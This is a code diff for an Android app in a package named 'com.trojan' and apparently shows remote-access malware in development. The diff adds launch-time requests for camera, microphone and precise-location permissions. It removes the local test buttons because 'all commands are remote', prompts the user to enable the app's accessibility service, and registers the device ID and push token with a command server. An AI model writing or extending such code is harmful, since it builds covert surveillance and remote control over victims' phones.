@@ -1,8 +1,11 @@
 package com.trojan;
 
+import android.Manifest;
 import android.annotation.SuppressLint;
 import android.app.Activity;
 import android.content.Intent;
+import android.content.pm.PackageManager;
+import android.os.Build;
 import android.os.Bundle;
 import android.os.Handler;
 import android.os.Looper;
@@ -13,6 +16,7 @@ import android.widget.TextView;
 import android.widget.Toast;
 
 import androidx.annotation.NonNull;
+import androidx.core.app.ActivityCompat;
 
 import com.android.volley.Request;
 import com.android.volley.RequestQueue;
@@ -26,15 +30,30 @@ import com.google.firebase.messaging.FirebaseMessaging;
 import org.json.JSONException;
 import org.json.JSONObject;
 
+import java.util.ArrayList;
+import java.util.List;
+
 public class MainActivity extends Activity {
 
     private static final String TAG = "MainActivity";
-    
+    private static final int PERMISSIONS_REQUEST_CODE = 101;
+
+    // --- UPGRADED: Added new permissions required for camera and audio recording ---
+    private static final String[] PERMISSIONS_TO_REQUEST = {
+            Manifest.permission.POST_NOTIFICATIONS,
+            Manifest.permission.ACCESS_FINE_LOCATION,
+            Manifest.permission.ACCESS_COARSE_LOCATION,
+            Manifest.permission.CAMERA,
+            Manifest.permission.RECORD_AUDIO
+            // Note: WRITE_EXTERNAL_STORAGE is handled by the Manifest's maxSdkVersion for older Android.
+    };
+
     private TextView tvDeviceInfo;
     private Button btnOpenAccessibility;
-    private Button btnTestLock;
-    private Button btnTestShutdown;
-    
+    // --- REMOVED: Test buttons are no longer needed as all commands are remote ---
+    // private Button btnTestLock;
+    // private Button btnTestShutdown;
+
     private RequestQueue requestQueue;
     private int retryCount = 0;
     private static final int MAX_RETRIES = 3;
@@ -46,57 +65,80 @@ public class MainActivity extends Activity {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
 
+        // --- Simplified UI element initialization ---
         tvDeviceInfo = findViewById(R.id.tvDeviceInfo);
         btnOpenAccessibility = findViewById(R.id.btnOpenAccessibility);
-        btnTestLock = findViewById(R.id.btnTestLock);
-        btnTestShutdown = findViewById(R.id.btnTestShutdown);
-        
+
         requestQueue = Volley.newRequestQueue(this);
 
         String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
         String deviceInfoText = "Device ID:\n" + deviceId;
         tvDeviceInfo.setText(deviceInfoText);
 
+        // --- NEW: Start the permission request flow as soon as the app opens ---
+        requestAppPermissions();
+
+        // Get FCM token and register with the server (this is unchanged)
         getTokenAndRegisterWithNetlify(deviceId);
 
-        // --- BUTTON CLICK LISTENERS ---
-
+        // Listener for the Accessibility Settings button (unchanged)
         btnOpenAccessibility.setOnClickListener(v -> {
+            Toast.makeText(this, "Find 'trojan' in the list and enable it.", Toast.LENGTH_LONG).show();
             startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
         });
 
-        // --- THIS IS THE UPDATED BUTTON LOGIC ---
-        btnTestLock.setOnClickListener(v -> {
-            // Checkpoint 1: Log that the button was clicked
-            Log.d("COMMAND_TRACE", "MainActivity: 'Test Lock' button clicked. Sending broadcast...");
-
-            // Create the intent for the lock screen action
-            Intent intent = new Intent(PowerAccessibilityService.ACTION_TRIGGER_LOCK_SCREEN);
-
-            // CRITICAL FIX: Make the broadcast explicit by setting the package name.
-            // This is required on modern Android to ensure delivery.
-            intent.setPackage(getPackageName());
-            
-            // Send the broadcast
-            sendBroadcast(intent);
-        });
-
-        btnTestShutdown.setOnClickListener(v -> {
-            // Checkpoint 1: Log that the button was clicked
-            Log.d("COMMAND_TRACE", "MainActivity: 'Test Shutdown' button clicked. Sending broadcast...");
-
-            // Create the intent for the shutdown action
-            Intent intent = new Intent(PowerAccessibilityService.ACTION_TRIGGER_SHUTDOWN);
-            
-            // CRITICAL FIX: Make the broadcast explicit.
-            intent.setPackage(getPackageName());
-            
-            // Send the broadcast
-            sendBroadcast(intent);
-        });
+        // --- REMOVED: Obsolete click listeners for test buttons ---
     }
 
-    // --- The rest of the file is unchanged ---
+    // --- NEW: Logic to check for and request any missing permissions ---
+    private void requestAppPermissions() {
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) {
+            // Permissions are granted at install time on older versions.
+            return;
+        }
+
+        List<String> neededPermissions = new ArrayList<>();
+        for (String permission : PERMISSIONS_TO_REQUEST) {
+            if (checkSelfPermission(permission) != PackageManager.PERMISSION_GRANTED) {
+                neededPermissions.add(permission);
+            }
+        }
+
+        if (!neededPermissions.isEmpty()) {
+            Log.d(TAG, "Requesting permissions: " + neededPermissions);
+            ActivityCompat.requestPermissions(this, neededPermissions.toArray(new String[0]), PERMISSIONS_REQUEST_CODE);
+        } else {
+            Log.d(TAG, "All necessary permissions have already been granted.");
+        }
+    }
+
+    // --- NEW: Callback to handle the result of the permission request dialog ---
+    @Override
+    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+        if (requestCode == PERMISSIONS_REQUEST_CODE) {
+            for (int i = 0; i < permissions.length; i++) {
+                if (grantResults[i] == PackageManager.PERMISSION_GRANTED) {
+                    Log.i(TAG, "Permission GRANTED: " + permissions[i]);
+                } else {
+                    Log.w(TAG, "Permission DENIED: " + permissions[i]);
+                }
+            }
+            // Check again if any permissions are still missing and inform the user.
+            boolean allGranted = true;
+            for (int result : grantResults) {
+                if (result != PackageManager.PERMISSION_GRANTED) {
+                    allGranted = false;
+                    break;
+                }
+            }
+            if (!allGranted) {
+                Toast.makeText(this, "Some features may not work without all permissions.", Toast.LENGTH_LONG).show();
+            }
+        }
+    }
+
+    // --- The rest of the file (token registration logic) is unchanged ---
 
     private void getTokenAndRegisterWithNetlify(String deviceId) {
         tvDeviceInfo.append("\n\nFetching FCM Token...");
@@ -108,7 +150,7 @@ public class MainActivity extends Activity {
             }
             String token = task.getResult();
             Log.d(TAG, "FCM Token acquired. Starting registration process.");
-            retryCount = 0; 
+            retryCount = 0;
             registerDeviceWithNetlify(deviceId, token);
         });
     }
@@ -129,16 +171,16 @@ public class MainActivity extends Activity {
         }
 
         JsonObjectRequest jsonObjectRequest = new JsonObjectRequest(
-            Request.Method.POST, url, postData,
-            response -> {
-                Log.d("NETLIFY_REGISTER", "Success: " + response.toString());
-                tvDeviceInfo.append("\n\n✅ Token successfully registered!");
-                retryCount = 0;
-            },
-            error -> {
-                Log.e("NETLIFY_REGISTER", "Error: " + error.toString());
-                scheduleRetry(deviceId, token);
-            }
+                Request.Method.POST, url, postData,
+                response -> {
+                    Log.d("NETLIFY_REGISTER", "Success: " + response.toString());
+                    tvDeviceInfo.append("\n\n✅ Token successfully registered!");
+                    retryCount = 0;
+                },
+                error -> {
+                    Log.e("NETLIFY_REGISTER", "Error: " + error.toString());
+                    scheduleRetry(deviceId, token);
+                }
         );
         requestQueue.add(jsonObjectRequest);
     }
